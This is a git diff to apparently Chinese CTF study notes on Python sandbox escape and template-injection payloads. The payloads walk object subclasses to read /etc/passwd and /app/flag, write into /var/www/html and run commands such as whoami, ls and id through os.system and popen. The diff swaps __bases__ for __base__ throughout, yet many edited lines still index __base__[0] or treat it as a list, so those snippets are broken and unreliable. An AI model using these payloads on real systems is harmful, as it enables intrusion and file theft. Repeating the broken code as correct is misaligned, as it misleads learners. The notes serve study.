@@ -257,7 +257,7 @@ print({}.__class__)
 
 <figure><img src="../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>
 
-#### Ⅱ.\_\_bases\_\_:
+#### Ⅱ.\_\_base\_\_:
 
 
 
@@ -266,13 +266,13 @@ print({}.__class__)
 使用语法
 
 ```
-类名.__bases__
+类名.__base__
 ```
 
 ```python
-print([].__class__.__bases__)
-print(().__class__.__bases__)
-print({}.__class__.__bases__)
+print([].__class__.__base__)
+print(().__class__.__base__)
+print({}.__class__.__base__)
 ```
 
 <figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>
@@ -325,10 +325,10 @@ print(C.__mro__)
 
 ```python
 
-print(''.__class__.__bases__[0].__subclasses__())
-print([].__class__.__bases__[0].__subclasses__())
-print(().__class__.__bases__[0].__subclasses__())
-print({}.__class__.__bases__[0].__subclasses__())
+print(''.__class__.__base__[0].__subclasses__())
+print([].__class__.__base__[0].__subclasses__())
+print(().__class__.__base__[0].__subclasses__())
+print({}.__class__.__base__[0].__subclasses__())
 
 class X(object):
     pass
@@ -461,9 +461,9 @@ print(A.__init__)
 
 ```python
 ''.__class__.__mro__[1]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
+{}.__class__.__base__[0]
+().__class__.__base__[0]
+[].__class__.__base__[0]
 object
 ```
 
@@ -472,14 +472,14 @@ object
 #### Ⅱ.读文件
 
 ```python
-().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
+().__class__.__base__[0].__subclasses__()[40](r'C:\1.php').read()
 object.__subclasses__()[40](r'C:\1.php').read()
 ```
 
 
 
 ```python
-[].__class__.__bases__[0].__subclasses__()[NUM]["get_data"](0,"/etc/passwd")
+[].__class__.__base__[0].__subclasses__()[NUM]["get_data"](0,"/etc/passwd")
 ```
 
 
@@ -505,7 +505,7 @@ x[NUM].__init__.__globals__['__builtins__'].eval("open('/app/flag').read()")
 #### Ⅲ写文件
 
 ```python
-().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+().__class__.__base__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 
 ```
@@ -515,7 +515,7 @@ object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 #### Ⅳ.执行任意命令
 
 ```python
-().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+().__class__.__base__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 object.__subclasses__()[40]('/var/www/html/input', 'w').write('123')
 
 ```
@@ -678,31 +678,31 @@ find_eval(url)
 查看warnings.catch\_warnings方法的位置
 
 ```python
-[].__class__.__bases__.__subclasses__().index(warnings.catch_warnings)
+[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
 ```
 
 查看linecatch的位置
 
 ```python
-[].__class__.__bases__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
 ```
 
 查找os模块的位置
 
 ```python
-[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
 ```
 
 查找system方法的位置（在这里使用os.open().read()一样可以实现一样的效果，步骤一样，不再复述）
 
 ```python
-[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
 ```
 
 调用systen方法
 
 ```python
-[].__class__.__bases__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
 ```
 
 
@@ -710,16 +710,40 @@ find_eval(url)
 **方法三：利用commands进行命令执行**
 
 ```python
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
+{}.__class__.__base__[0].__subclasses__()[59].__init__.globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
 ```
 
 ```python
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
+{}.__class__.__base__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
 ```
 
 ```python
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+{}.__class__.__base__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+***
+
+就算知识点总结过了，还是觉得不是很懂，我们寻找网课。
+
+[https://www.youtube.com/watch?v=QLqHMMcBXuQ\&list=PL1GDzLoRwyVCEG\_dnWcQDbDXJSBw7lTOT](https://www.youtube.com/watch?v=QLqHMMcBXuQ\&list=PL1GDzLoRwyVCEG\_dnWcQDbDXJSBw7lTOT)
+
+
+
+
+
+
 
 
 
